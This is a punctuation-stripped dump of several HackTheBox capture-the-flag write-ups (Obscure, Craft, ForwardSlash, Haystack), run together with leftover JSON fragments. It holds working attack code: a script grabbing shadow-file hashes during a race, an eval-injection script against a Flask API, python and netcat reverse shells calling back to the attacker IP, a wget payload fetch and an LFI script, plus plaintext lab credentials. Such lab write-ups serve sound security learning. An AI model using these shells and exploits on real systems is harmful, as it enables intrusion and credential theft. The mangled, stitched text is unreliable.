else printIncorrect pass osremovetmpSSHpath sysexit0 osremoveospathjointmpSSHpath except Exception as e tracebackprintexc sysexit0 if sessionauthenticated 1 while True command inputsessionuser Obscure cmd sudo u sessionuser cmdextendcommandsplit proc subprocessPopencmd stdoutsubprocessPIPE stderrsubprocessPIPE oe proccommunicate printOutput odecodeascii printError edecodeascii if lenedecodeascii 0 else print As the name suggest this script aim to serve as a replacement for SSH After reading the code we can understand the main logic is the following 1 Get the user to input username and password sessionuser inputEnter username passW inputEnter password 2 Open and parse the etcshadowhttpswwwtldporgLDPlameLAMElinuxadminmadeeasyshadowfileformatshtmlhttpswwwtldporgLDPlameLAMElinuxadminmadeeasyshadowfileformatshtml file to a temporary file in tmpSSH path joinrandomchoicesstringasciiletters stringdigits k8 with openetcshadow r as f data freadlines data psplit if in p else None for p in data passwords for x in data if not x None passwordsappendx passwordFile njoinnjoinp for p in passwords with opentmpSSHpath w as f fwritepasswordFile at this point the created tmp file should like something like this bash root 6rixxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxch4dy 111111 0 111111 1 hugo 6qpePkxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc6RAj 111111 0 111111 1 3 Check if username exist if username dont exist the temp file get removed and the script exit for p in passwords if p0 sessionuser salt realPass p1split2 break if salt printInvalid user osremovetmpSSHpath sysexit0 4 If the username exist the password get hashed and compared to the hash in the temp file coming from etcshadow to see if they match In the end the temp file get removed wether the password was correct or not salt 6salt realPass salt realPass hash cryptcryptpassW salt if hash realPass printAuthed sessionauthenticated 1 else printIncorrect pass osremovetmpSSHpath sysexit0 osremoveospathjointmpSSHpath 5 If the password if also correct we get dropped in a pseudo shell if sessionauthenticated 1 while True command inputsessionuser Obscure cmd sudo u sessionuser cmdextendcommandsplit proc subprocessPopencmd stdoutsubprocessPIPE stderrsubprocessPIPE oe proccommunicate printOutput odecodeascii printError edecodeascii if lenedecodeascii 0 else print Alright So with all of this in mind what can of flaw can we find in that First thing that came to my mind was to edit the script to display the retrieved root hash But of course it can not be that easy we dont have write rights since the file is owned by root bash robertobscureBetterSSH ls l total 4 rwxrxrx 1 root root 1805 Oct 5 1309 BetterSSHpy Then what The temporary file catch the attention aswell If we manage to read it before it get deleted we could retrieve root user password hash We are facing two issues here 1 The file name is random 2 The file get deleted immediately after creation The script allow no pause where we could read the file before it gets deleted At this point we will need to write a script monitoring the tmpSSH folder for any file creation and grab its content as fast as possible before it get deleted To do so I wrote a simple script import os path tmpSSH before dictfile None for file in oslistdirpath while True after dictfile None for file in oslistdirpath added file for file in after if file not in before if added with openpath added0 r as newfile printnewfileread before after Basically the script will loop forever while listing file in tmpSSH if a new file is detected it will print its content Lets drop it on the server and give it a try bash robertobscure python3 tmpwatchsshpy In another shell lets run the betterSSHpy script bash robertobscure sudo usrbinpython3 homerobertBetterSSHBetterSSHpy Enter username hg8 Enter password hg8 Invalid user Going back to our script we can see it worked bash robertobscure python3 tmpwatchsshpy root 6riekpK4muBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1 18226 0 99999 7 robert 6fZZcDG7glfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XUTCIHgavst7Lj8wLFxQ21jYW5nD66aJsvQSPy1zbH 18163 0 99999 7 Cracking Root password hash Now that we have the hash lets hope it can be cracked I will use john the ripper bash hg8archbook echo 6fZZcDG7glfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XUTCIHgavst7Lj8wLFxQ21jYW5nD66aJsvQSPy1zbH roothash hg8archbook john wordlistSecListsPasswordsLeakedDatabasesrockyoutxt roothash Press q or CtrlC to abort almost any other key for status mercedes Session completed Alright We have the root password lets try to use it with the betterSSHpy script bash sudo usrbinpython3 homerobertBetterSSHBetterSSHpy Enter username root Enter password mercedes Authed rootObscure cat rootroottxt Output 5xxxxxxxxxxxxxxxxxxxxxxxxx3 As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Craft - HackTheBox","tags":["hackthebox","ctf","craft","gogs","api","flask","python","eval","git","vault"],"href":"/posts/craft","content":"Craft was a not so straight forward box mainly based on little configuration mistakes rather than exploits Which makes it more interesting in my opinion I learned a few tricks on this one First thing first lets add the box IP to the hosts file bash hg8archbook echo 101010110 crafthtb etchosts and lets start User Flag Recon Lets start with the classic nmap scan bash hg8archbook nmap sV sT sC crafthtb Starting Nmap 780 httpsnmaporg at 20191020 0126 CEST Nmap scan report for crafthtb 101010110 Host is up 0048s latency Not shown 998 closed ports PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 74p1 Debian 10deb9u5 protocol 20 443tcp open sslhttp nginx 1158 httpserverheader nginx1158 Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 1715 seconds We have a classical web app running on port 443 and the ssh port 22 open Opening httpcrafthtb display the following website Craft Websitehttpsuserimagesgithubusercontentcom9076747671588040db48600f33d11e998f1b10407a44179png This website is super simple but give us two valuable information A gogs instance running gogs is a selfhosted Git service written in Go at httpsgogscrafthtb An api is running and its documentation available at httpsapicrafthtbapi We need to add those two in our etchosts file to be able to access it bash hg8archbook echo 101010110 gogscrafthtb etchosts hg8archbook echo 101010110 apicrafthtb etchosts Following this gogscrafthtb displays Gogs instance Craft websitehttpsuserimagesgithubusercontentcom907674767158918b8797400f33e11e992232ac64d958595png and apicrafthtb displays Craft API websitehttpsuserimagesgithubusercontentcom907674767158927c8915380f33e11e98c59cc2973c76cfdpng We have the source code and the documentation of the API That will surely be our entry point Out of curiosity I checked for exploit on Gogs and found CVE201818925 and CVE201820303 Gogs 01166 allows remote code execution because it does not properly validate session IDs as demonstrated by a sessionfile forgery in the file session provider in filego httpsnvdnistgovvulndetailCVE201818925 In pkgtoolpathgo in Gogs before 011821218 a directory traversal in the fileupload functionality can allow an attacker to create a file under datasessions on the server httpsnvdnistgovvulndetailCVE201820303 An exploit is also avaible GogsOwnzhttpsgithubcomTheZ3rogogsownz and allows to gain administrator rights and RCE on a GogsGitea server Unfortunately the footer of gogscrafthtb shows that the version used is not a vulnerable one 2018 Gogs Version 011860130 This confirms that our entry point will probably be the api Lets investigate Since we have the code source it will greatly help our investigation The API is in Python with the Flask framework Lets clone it to check the code more easily bash hg8archbook GITSSLNOVERIFYtrue git clone httpsgogscrafthtbCraftcraftapigit Remote code execution on API The first thing I do when doing static code analysis is checking if dangerous functions are used and can be used for command injection Its the easiest way to land a shell on a box If this search dont give any results I will move on to SQL injection and so on The most common way command injection vulnerability get introduced in Python is by the eval function which is used to run the python code which is passed as an argument within the program A quick grep will tell us if such function is used within the API bash hg8archbook grep ri eval craftapi craftapicraftapiapibrewendpointsbrewpy if evals 1 requestjsonabv We are lucky and just by the look of the line it seems like no sanitization is done and the abv request parameter is directly run through eval Reading through the code of brewpy confirm the suspicion python authauthrequired apiexpectbeerentry def postself Creates a new brew entry make sure the ABV value is sane if evals 1 requestjsonabv return ABV must be a decimal value less than 10 400 else createbrewrequestjson return None 201 Any Python code send in the request abv parameter will get interpreted Unfortunately authauthrequired inform us that we will first need a way to authenticate ourselves before being able to use this vulnerable endpoint Reading the documentation and the code source it doesnt seem there is any way to create a new account or use an already made token to authenticate to the API We need to find another way to authenticate Since we have access to the git repository we can try to exploit common flaw found in gitsvn repositories The most common issue is developers accidentally push API keys token or password to the repository There is a few good tools like truffleHoghttpsgithubcomdxa4481truffleHog or gitsecretshttpsgithubcomawslabsgitsecrets allows to automatically retrieve secrets and credentials accidentally committed Since there is only 6 commits in history we can manually review them to make sure we dont forget anything At commit a2d28ed155 we find an interesting cleanup Commit cleanuphttpsuserimagesgithubusercontentcom907674767160472668e1980f35111e98cb2f2f49bae0833png Lets try to use those credentials to authenticate to the API bash hg8archbook curl httpsapicrafthtbapiauthlogin k user dinesh4aUh0A8PbVJxgd tokeneyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQJpQJlqqcpYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE hg8archbook curl H XCraftApiToken eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQJpQJlqqcpYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE httpsapicrafthtbapiauthcheck k messageToken is valid We are authenticated Note here that this API doesnt use the usual Authorization Bearer header but a custom header in the format XCraftApiToken It can be easy to overlook this one thats why taking time to read the code and understanding the inner workings of the app is important python craftapiapiauthendpointsauthpy token requestheadersXCraftApiToken We have now all the needed information to perform our command injection Since we need to authenticate and perform multiple queries on the brew endpoint I decided to write a script to avoid writing a thousand curl request No need to start from scratch since craftapiteststestpy already provide a solid base I tweaked it a little to end up with this script python usrbinenv python import requests import json import urllib3 urllib3disablewarningsurllib3exceptionsInsecureRequestWarning response requestsgethttpsapicrafthtbapiauthlogin authdinesh 4aUh0A8PbVJxgd verifyFalse jsonresponse jsonloadsresponsetext token jsonresponsetoken headers XCraftAPIToken token ContentType applicationjson response requestsgethttpsapicrafthtbapiauthcheck headersheaders verifyFalse printresponsetext make sure token is valid while True cmd input brewdict brewdictabv importospopenreadformatcmd brewdictname bullshit brewdictbrewer bullshit brewdictstyle bullshit jsondata jsondumpsbrewdict response requestsposthttpsapicrafthtbapibrew headersheaders datajsondata verifyFalse Since eval will run any python code we will use this lambda function importospopenCMDread to run an os command from the python code I added a input so we simply have to type our command to run it on the API Shell style Unfortunately we dont have any output available so how are we going to know that our command executed successfully With timebased injection We are going to inject a sleep 5 command If the API hang for 5 seconds it means our command got executed successfully If the API respond immediately the injection failed Using the requests library elapsedtotalseconds function we can display the time elapsed for the request to success I add it to the script so we can easily see if the sleep 5 injection worked fine python printExecution time formatresponseelapsedtotalseconds Lets it give a try bash hg8archbook python testpy messageToken is valid test Execution time 0147798 sleep 5 Execution time 5158874 Looks like it worked fine Lets tweak our script a bit to be more confortable to use diff brewdictabv importospopenreadformatcmd brewdictabv importospopen sleep 3readformatcmd The usage of sleep 3 means that the sleep command will only get executed if the first command succeeded This technique will allow us to blindly learn about the box environment Here is an example to illustrate bash hg8archbook python testpy messageToken is valid curl help Execution time 0162407 wget help Execution time 3160078 Since wget help command took 3 seconds to execute this means that the command run fine While curl help failed the sleep 3 didnt start meaning curl is not probably not installed This little trick will allow us to have a valuable feedback to know if our command succeed or fail Lets try to open our classic reverse shell Start with our listener bash hg8archbook nc l vv p 8585 Listening on any address 8585 And launch our test script on the API bash hg8archbook python testpy messageToken is valid nc e binsh 10101085 8585 Execution time 0218422 nc help Execution time 4412322 Oddly enough this is not working whereas nc seems to be installed Thats strange but lets move on to a different type of reverse shell Since we know for sure that python is installed lets use a python reverse shell To make things easier lets launch a small http server to host our python reverse shell file bash hg8archbook cat hg8py import socketsubprocessos ssocketsocketsocketAFINETsocketSOCKSTREAM sconnect101010858585 osdup2sfileno0 osdup2sfileno1 osdup2sfileno2 psubprocesscallbinshi hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 And back to our original terminal lets launch our injection bash hg8archbook python testpy messageToken is valid wget 101010858000hg8py O tmphg8py Execution time 115602 python tmphg8py And surely enough a connection open on our netcat listener bash hg8archbook nc l vv p 8585 Listening on any address 8585 Connection from 10101011057154 optapp id uid0root gid0root groups0root1bin2daemon3sys4adm6disk10wheel11floppy20dialout26tape27video Note Now that we are on the box we can investigate on why our original netcat command wasnt working The netcat version shipped in this box in a Busybox version The manual state optapp nc BusyBox v1293 20190124 074507 UTC multicall binary Usage nc OPTIONS HOST PORT connect nc OPTIONS l p PORT HOST PORT listen e PROG Run PROG after connect must be last In this version e option must be last So if we ran nc 10101085 8585 e binsh instead of nc e binsh 10101085 8585 the command would have succeeded perfectly I tried and it worked Odd but good to keep in mind for the future Pivot from docker container to user Now back to our topic We got our shell on the API Unfortunately as you noticed with the id command it seems like we are in a docker container From here we wont go far from here Our best bet might be to retrieve the API secrets to see if we can progress from here bash optappcraftapi cat settingspy Flask settings FLASKSERVERNAME apicrafthtb FLASKDEBUG False Do not use debug mode in production FlaskRestplus settings RESTPLUSSWAGGERUIDOCEXPANSION list RESTPLUSVALIDATE True RESTPLUSMASKSWAGGER False RESTPLUSERROR404HELP False CRAFTAPISECRET hz66OCkDtv8G6D database MYSQLDATABASEUSER craft MYSQLDATABASEPASSWORD qLGockJ6G2J75O MYSQLDATABASEDB craft MYSQLDATABASEHOST db SQLALCHEMYTRACKMODIFICATIONS False Lets try to dump the database for juicy informations bash optapp mysql binsh mysql not found Of course in this jail no mysql available either Earlier I noticed a database test script We will edit use this python script since nothing else is available First lets list the tables python usrbinenv python import pymysql from craftapi import settings connection pymysqlconnecthostsettingsMYSQLDATABASEHOST usersettingsMYSQLDATABASEUSER passwordsettingsMYSQLDATABASEPASSWORD dbsettingsMYSQLDATABASEDB cursorclasspymysqlcursorsDictCursor try with connectioncursor as cursor sql SELECT tablename FROM informationschematables cursorexecutesql result cursorfetchall for row in result printrow finally connectionclose Running this script will return two tables brew and users Of course lets list the users by editing the dbtestpy script diff sql SELECT tablename FROM informationschematables sql SELECT FROM user bash optapp python dbtestpy id 1 username dinesh password 4aUh0A8PbVJxgd id 4 username ebachman password llJ77D8QFkLPQB id 5 username gilfoyle password ZEU3N8WNM2rh4T Good a few users with plaintext passwords Trying each one on the ssh doesnt work Wont be useful as API credentials So what remains is to go back to the Gogs instance Login as gilfoyle gives us access to a very interesting private repository Craft Infra Repositoryhttpsuserimagesgithubusercontentcom90767476716267894318d80f36611e9937704c310d8654apng Lets clone it to explore it bash hg8archbook GITSSLNOVERIFYtrue git clone httpsgilfoyleZEU3N8WNM2rh4Tgogscrafthtbgilfoylecraftinfragit First thing that catches the eye is the ssh folder containing both the public and private key We should be able to use to login as gilfoyle through SSH bash hg8archbook chmod 600 sshidrsa hg8archbook ssh gilfoylecrafthtb i idrsa Ooc o Q0CGO Enter passphrase for key idrsa Linux crafthtb 4908amd64 1 SMP Debian 491302 20181027 x8664 Last login Sun Oct 20 062605 2019 from 10101550 gilfoylecraft A passphrase is needed for the idrsa key fortunately we have a case of password reuse and the password ZEU3N8WNM2rh4T found in the database dump is valid bash gilfoylecraft cat usertxt bbfxxxxxxxxxxxxxa612d4 Root Recon On user gilfoyle nothing particulary catch the eye and the box seems well configured Upon enumeration we still notice an uncommon ssh configuration bash gilfoylecraft cat etcsshsshdconfig PermitRootLogin yes It looks like our entry door for root flag will be through ssh Inspecting files in the home directory also shows a token that might be useful bash gilfoylecraft ls a bashrc config gnupg profile ssh usertxt vaulttoken viminfo gilfoylecraft cat vaulttoken f1783c8d41c70b12d1c1cf2aa17ac6b9 We notice this is about Vault again we saw it already in the craftinfra repository Lets dig I didnt know anything about Vault so I checked their website A tool for secrets management encryption as a service and privileged access management httpswwwvaultprojectio Exploiting Vault for SSH root password If we put all the puzzle pieces together it seems like this tool is storing either the root account password or a way to access the root account through ssh The file craftinfrasrcmastervaultsecretssh on the craftinfra repository looks promising bash binbash set up vault secrets backend vault secrets enable ssh vault write sshrolesroototp keytypeotp defaultuserroot cidrlist00000 It confirms that Vault is used for ssh access to root keytypeotp seems to mean that its working as a onetime password mechanism After a bit of Googling we find this documentation on Vault The OneTime SSH Password OTP SSH secrets engine type allows a Vault server to issue a OneTime Password every time a client wants to SSH into a remote host using a helper command on the remote host to perform verification httpswwwvaultprojectiodocssecretssshonetimesshpasswordshtml Alright we have all the needed information Lets generate a OneTime Password for the root account From here I will follow the documentation linked above First we need to mount the secrets engine bash gilfoylecraft vault secrets enable ssh Successfully mounted ssh at ssh Then we create a role with the keytype parameter set to otp I will use the same command than the one in craftinfrasrcmastervaultsecretssh to make sure we are not missing anything bash gilfoylecraft vault write sshrolesroototp keytypeotp defaultuserroot cidrlist00000 Success Data written to sshrolesroototp Last step we create an OTP credential for an IP of the remote host that belongs to otpkeyrole bash gilfoylecraft vault write sshcredsroototp ip101010110 Key Value leaseid sshcredsroototp15c8d88c4e1a6ec64cbb616cf25e1a7d leaseduration 768h leaserenewable false ip 101010110 key 3d32eb8a61b133764402dd15e72206f8 keytype otp port 22 username root Seems like everything went fine Lets launch a new terminal and try to login as root bash hg8archbook ssh rootcrafthtb Ooc o Q0CGO Password Linux crafthtb 4908amd64 1 SMP Debian 491302 20181027 x8664 Last login Sun Oct 20 061003 2019 from 127001 rootcraft rootcraft cat roottxt 831dxxxxxxxxxxx11591 This box was really a fun time and my favorite so far as always do not hesitate to contact me for any questions or feedback See you next time hg8"},{"title":"ForwardSlash - HackTheBox","tags":["hackthebox","ctf","forwardslash"],"href":"/posts/forwardslash","content":"ForwardSlash was a really cool box but full of rabbit holes it could be very frustrating for some but also very fun for others Globally I really enjoyed this box and learned a few tricks The only drawbacks of this box is it required users to reset the box after getting the root flag since the root access greatly spoil other users Unfortunately most users dont clean up after them leaving the root access wide open and easy TlDr The user flag consisted in accessing a backup website location creating account on it as admin from there you could exploit an Local File Inclusion vulnerability to extract php files containing credentials for chiv user Next step was to pivot from chiv to pain user by reversing a suid homemade backup manager to display config file backup using a symbolic link The root flag could be accessed after decrypting a encrypted text file in pain home folder Having access to the decryption function and using a weak algorithm it was possible to bruteforce the key used to encrypt the text file that turn out to contains the password of an encrypted LUKS disk containing the root user SSH private key file The box had 2 ways to access to chiv user and an unintended way to access root flag that I will describe in this writeup Alright Lets get into the details now First thing first lets add the box IP to the host file bash hg8archbook echo 101010183 forwardslashhtb etchosts and lets start User flag Recon Lets start with the classic nmap scan to see which ports are open on the box bash hg8archbook nmap sV sT sC forwardslashhtb Starting Nmap 780 httpsnmaporg at 20200405 1314 CEST Nmap scan report for forwardslashhtb 101010183 PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp open http Apache httpd 2429 Ubuntu httpserverheader Apache2429 Ubuntu httptitle Backslash Gang Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 810 seconds We have the classic A web app running on port 80 and the SSH port 22 open Opening httpforwardslashhtb display the following website Forwardslash homepagehttpsuserimagesgithubusercontentcom9076747793139325c6466807f0111ea90d00bd591c571f0png Forwardslash homepage Another hacked website The message seems to gives us information about the website got compromised This was ridiculous who even uses XML and Automatic FTP Logins Lets keep that in mind for later Lets now run gobuster to see if he can find some juicy files and folders bash hg8archbook gobuster dir u httpforwardslashhtb w SecListsDiscoveryWebContentbigtxt x php Gobuster v301 by OJ Reeves TheColonial Christian Mehlmauer FireFart htpasswd Status 403 htpasswdphp Status 403 htaccess Status 403 htaccessphp Status 403 indexphp Status 200 serverstatus Status 403 20200405 131924 Finished Nothing Thats odd Lets try with different file extension First with xml since its stated in the hacker message Still no results Trying other common extensions until bash hg8archbook gobuster dir u httpforwardslashhtb w SecListsDiscoveryWebContentbigtxt x txt Gobuster v301 by OJ Reeves TheColonial Christian Mehlmauer FireFart htaccess Status 403 htaccesstxt Status 403 htpasswd Status 403 htpasswdtxt Status 403 notetxt Status 200 serverstatus Status 403 20200405 132519 Finished notetxt thats not much but its a start bash hg8archbook curl httpforwardslashhtbnotetxt Pain we were hacked by some skids that call themselves the Backslash Gang I know That name Anyway I am just leaving this note here to say that we still have that backup site so we should be fine chiv Its a note from one of the website developer The interesting part is him saying we still have that backup site Since gobuster didnt discover any other subdirectories and nmap no other open ports what remains Subdomain probably To give a try lets add backupforwardslashhtb to our host file bash hg8archbook echo 101010183 backupforwardslashhtb etchosts Bingo Opening httpbackupforwardslashhtb display a login form backup forwardslash loginhttpsuserimagesgithubusercontentcom9076747793141039df511807f0111ea9bfb093dbecbb193png backup forwardslash login ForwardSlash Backup Site First thing I always try when stumbling upon Login form is trying to login with the credentials adminadmin This time it doesnt work but a error message says No account found with that username admin Might be interesting to keep that in mind for later Since there is a register form lets create an account and connect to this backup platform welcome page backup forwardslashhttpsuserimagesgithubusercontentcom907674779314354e3b1da007f0111ea8af2a2a4605f2b07png welcome page backup forwardslash We arrive to the dashboard with different options for editing our current accounts and two informations pages Lets focus on the Change profile picture page Profile picture upload page are often a good way to upload a web shell to a server Method 1 Profile picture Local File Inclusion Once opening the page we get another message from the pain user change picture forwardslashhttpsuserimagesgithubusercontentcom907674779314465fe844e807f0111ea8893deff73d490ebpng change picture forwardslash While inspecting the source code we can indeed see that both text file and submit button have been set to disabled remove disabled forwardslashhttpsuserimagesgithubusercontentcom90767477931453712c84b807f0211ea97448e93f9db3703png From the first look it seems like simply removing the disabled attribute will allow us to use the form Since the form takes a URL lets open a python web server on our machine to see if the form is making call to the given url bash hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 form call forwardslashhttpsuserimagesgithubusercontentcom907674779314626368b91807f0211ea8d01a3503bd96e5dpng And indeed when validating the form a new request appear on our web server confirming that the Photo Update function is still running and only the HTML form got disabled bash hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 101010183 08Apr2020 203825 GET HTTP10 200 But something more interesting appear on the page return page forwardslashhttpsuserimagesgithubusercontentcom9076747793147275cb131807f0211ea8465903f31c33af2png The web server return message gets displayed below the form This sounds like a great way to achieve SSRF dont you think But right now something else come to my mind Seeing the box name ForwardSlash can we use this form to achieve Local File Inclusion Lets see if we can access the indexphp file from here forwardslash change picture lfiimgscreenshot93f234f3cb260f7b67bcb1f0999596f1a31c9adapng forwardslash change picture lfi Permission Denied not that way Seems like we are almost on the right track Lets try the classical etcpasswd to validate or not the LFI theory etc passwd forwardslashhttpsuserimagesgithubusercontentcom907674779315755af3f1d807f0311ea9c398601359c4adbpng Bingo We can see two users on the box chiv and pain The same two developers we have seen leaving messages around Lets keep that in mind for later Now lets try to access other useful files using this LFI From here I decided to write a small script to ease the LFI process As much as possible its always good to write your own script to make sure you understand every steps you are doing This script is clearly not the prettiest one nor that most performant to it do the job well enough import requests import sys import re PHPSESSID xxxxxxxxxxxxxxxxxxxxx cookies PHPSESSID PHPSESSID while True filepath inputFile path payload url filepath r requestsposthttpbackupforwardslashhtbprofilepicturephp cookiescookies datapayload if lenrcontent 689 689 is the size or normal response fileonly resub rtext 1 reDOTALL printfileonly continue printPermission Denied File does not exist Lets give it a try bash hg8archbook python lfiblogpy File path etcpasswd rootx00rootrootbinbash daemonx11daemonusrsbinusrsbinnologin binx22binbinusrsbinnologin sysx33sysdevusrsbinnologin syncx465534syncbinbinsync gamesx560gamesusrgamesusrsbinnologin manx612manvarcachemanusrsbinnologin lpx77lpvarspoollpdusrsbinnologin mailx88mailvarmailusrsbinnologin newsx99newsvarspoolnewsusrsbinnologin uucpx1010uucpvarspooluucpusrsbinnologin proxyx1313proxybinusrsbinnologin wwwdatax3333wwwdatavarwwwusrsbinnologin backupx3434backupvarbackupsusrsbinnologin listx3838Mailing List Managervarlistusrsbinnologin ircx3939ircdvarrunircdusrsbinnologin gnatsx4141Gnats BugReporting System adminvarlibgnatsusrsbinnologin nobodyx6553465534nobodynonexistentusrsbinnologin systemdnetworkx100102systemd Network Managementrunsystemdnetifusrsbinnologin systemdresolvex101103systemd Resolverrunsystemdresolveusrsbinnologin syslogx102106homesyslogusrsbinnologin messagebusx103107nonexistentusrsbinnologin aptx10465534nonexistentusrsbinnologin lxdx10565534varliblxdbinfalse uuiddx106110runuuiddusrsbinnologin dnsmasqx10765534dnsmasqvarlibmiscusrsbinnologin landscapex108112varliblandscapeusrsbinnologin pollinatex1091varcachepollinatebinfalse sshdx11065534runsshdusrsbinnologin painx10001000painhomepainbinbash chivx10011001Chivatohomechivbinbash mysqlx111113MySQL Servernonexistentbinfalse File path Faster and easier to read right Using this lets try to access as much file as we can first lets try the usual sensitive SSH keys bash hg8archbook python lfiblogpy File path homechivsshidrsa Permission Denied File does not exist File path homepainsshidrsa Permission Denied File does not exist File path It would have been too easy right of course Maybe if can find the web app path we can access the app source code with sensitive informations bash hg8archbook python lfiblogpy File path configphp We have here the credentials of the temp database this wont be very useful Since we know the server is Apache lets see if the web app is stored in the default Apache folder bash hg8archbook python lfiblogpy File path configphp You call this security LOL absolute trash server Unfortunately its the defaced website laying here and its the backup website that will be interesting for us Knowing that the server is Apache you can guess that backupforwardslashhtb is using a Virtual Hosthttpshttpdapacheorgdocs24envhostsexampleshtml In addition a common practice is to use the domain name as folder to setup Virtual Host since its easier for organization For example bash Listen 80 DocumentRoot varwwwhtml ServerName forwardslashhtb DocumentRoot varwwwforwardslashhtb ServerName backupforwardslashhtb Lets now try to see if our theory is correct bash hg8archbook python lfiblogpy File path varwwwbackupforwardslashhtbregisterphp varwwwbackupforwardslashhtbdevindexphp php if ftploginconnid chiv N0bodyL1kesBack FTP credentials for chiv user that explains why the defaced homepage mentioned who even uses XML and Automatic FTP Logins Since nmap didnt return any open FTP server lets try to reuse those credentials to login into SSH bash hg8archbook ssh chivforwardslashhtb chivforwardslashhtbs password Welcome to Ubuntu 18044 LTS GNULinux 415091generic x8664 Last login Tue Mar 24 113437 2020 from 1010143 chivforwardslash ls chivforwardslash Method 2 XXE Local File Inclusion on dev API The second method was the main one to go to Thats the one I used Lets see in detail the process First lets see the first rabbit hole I fell into Knowing that the dev endpoint cant be accessed from our host we can imagine its accessible from 127001 right With this knowledge we could exploit again the TODO Rabbit hole of trying to access dev from the first LFI but can not work properly As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Haystack - HackTheBox","tags":["hackthebox","ctf","haystack","gobuster","steganography","elasticsearch","logstash","kibana","elk","cve-2018-17246","lfi"],"href":"/posts/haystack","content":"Haystack is a very interesting box to learn more about the ELK Elasticsearch Logstash Kibana stack which is becoming very popular The user part is very CTF type while the root part is more realistic scenario First thing first lets add the box IP to the hosts file sh hg8archbook echo 101010115 haystackhtb etchosts User Flag Recon Lets start with the classic nmap scan hg8archbook nmap sV sT sC 101010115 Starting Nmap 770 httpsnmaporg at 20190829 2208 CEST Nmap scan report for haystackhtb 101010115 Host is up 075s latency Not shown 997 filtered ports PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 74 protocol 20 80tcp open http nginx 1122 9200tcp open http nginx 1122 Nmap done 1 IP address 1 host up scanned in 8723 seconds Alright nothing suprising here SSH HTTP and 9200 which is port used by Elasticsearch Lets start http Once opening httphaystackhtb we are greeted with a single image html gobuster doesnt find anything else interresting So lets check this image bash hg8archbook wget haystackhtbneedlejpg hg8archbook file needlejpg needlejpg JPEG image data JFIF standard 101 resolution DPI density 96x96 segment length 16 Exif Standard TIFF image data bigendian direntries5 xresolution74 yresolution82 resolutionunit2 softwarepaintnet 411 baseline precision 8 1200x803 components 3 So far so good nothing suspicious Lets see if we can find strings in it bash hg8archbook strings needlejpg bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg Lets decode this base64 string bash hg8archbook echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg base64 d la aguja en el pajar es clave A hint Lets keep clave in mind key in Spanish I think there is nothing else to find on the http service so lets move on to the Elasticsearch instance Elasticsearch Opening port 9200 return the following json json hg8archbook http haystackhtb9200 HTTP11 200 OK clustername elasticsearch clusteruuid pjrX7VgSFmJYDxP4tCQg name iQEYHgS tagline You Know for Search version builddate 20180926T133409098244Z buildflavor default buildhash 04711c2 buildsnapshot false buildtype rpm luceneversion 740 minimumindexcompatibilityversion 500 minimumwirecompatibilityversion 560 number 642 Its a classic Elastic cluster On version 642 not the most recent one We can use the cat endpoint to list all indexes hg8archbook http haystackhtb9200catindices HTTP11 200 OK kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0 2 0 143kb 143kb quotes ZG2D1IqkQNiNZmi2HRImnQ 5 1 253 0 2627kb 2627kb bank eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 4832kb 4832kb So we have bank with 1000 records and quotes with 253 records Lets search across those documents to see if we can find something interesting with our previous hint in mind According the the documentationhttpswwwelasticcoguideenelasticsearchreference64searchsearchhtml we can use the search endpoint to search across all documents Searching for the keyword key doesnt seem to return any interesting user or information Lets try with the clave keyword we found in the image json hg8archbook http haystackhtb9200searchqclave HTTP11 200 OK shards failed 0 skipped 0 successful 11 total 11 hits hits id 45 index quotes score 59335938 source quote Tengo que guardar la clave para la maquina dXNlcjogc2VjdXJpdHkg type quote id 111 index quotes score 53459888 source quote Esta clave no se puede perder la guardo aca cGFzczogc3BhbmlzaC5pcy5rZXk type quote maxscore 59335938 total 2 timedout false took 25 Neat sounds promising Lets decode bash hg8archbook echo dXNlcjogc2VjdXJpdHkg base64 d user security hg8archbook echo cGFzczogc3BhbmlzaC5pcy5rZXk base64 d pass spanishiskey An username and a password couldnt ask for anything better Is that SSH credentials bash hg8archbook ssh securityhaystackhtb securityhaystackhtbs password Last login Thu Aug 29 162415 2019 from 10101085 securityhaystack securityhaystack cat usertxt 04d1xxxxxxxxxxxxxxx8eb929 First step done Time for root Root flag Now that we have user lets try to elevate privilege Privilege enumeration scripts output nothing really interresting so lets focus on the ELK stack again which seems the core part of this box Pivot security kibana user Kibana and Logstash are installed but configuration files are inaccesible to the security user bash securityhaystack confd cat etcpasswd securityx10001000securityhomesecuritybinbash elasticsearchx997995elasticsearch usernonexistentsbinnologin logstashx996994logstashusrsharelogstashsbinnologin kibanax994992kibana service userhomekibanasbinnologin securityhaystack confd cd optkibana bash cd optkibana Permiso denegado securityhaystack confd cat etclogstashconfdfilterconf cat etclogstashconfdfilterconf Permiso denegado Seems like we will need to pivot to Kibana or Logstash user to 